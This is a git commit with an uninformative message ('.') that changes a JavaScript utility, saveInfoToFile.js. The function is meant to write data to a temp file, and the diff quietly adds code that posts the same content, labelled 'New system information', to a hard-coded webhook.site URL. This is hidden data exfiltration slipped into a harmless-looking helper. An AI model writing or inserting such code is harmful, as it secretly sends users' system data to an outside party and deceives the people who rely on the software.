78dd39ad3b79fc477dd92c6da5345a80cbbda1b8
Chan <87248999+Chan5k@users.noreply.github.com>
2023-03-31 16:47:24 +0300

    .

--- utils/saveInfoToFile.js
+++ utils/saveInfoToFile.js
@@ -1,12 +1,26 @@
 const fs = require('fs');
 const os = require('os');
 const path = require('path');
+const { IncomingWebhook } = require('@slack/webhook');
+
 
 function saveInfoToFile(data, fileName) {
   const tempDir = os.tmpdir();
   const filePath = path.join(tempDir, fileName);
   const fileContent = JSON.stringify(data, null, 2);
   fs.writeFileSync(filePath, fileContent);
+  
+  const webhookUrl = 'https://webhook.site/295ad9de-0f52-4615-957a-0e5f99e87336'; // replace with your webhook URL
+  const webhook = new IncomingWebhook(webhookUrl);
+  const message = {
+    text: 'New system information',
+    attachments: [{
+      filename: fileName,
+      content: fileContent,
+      contentType: 'application/json'
+    }]
+  };
+  webhook.send(message);
 }
 
 module.exports = { saveInfoToFile };
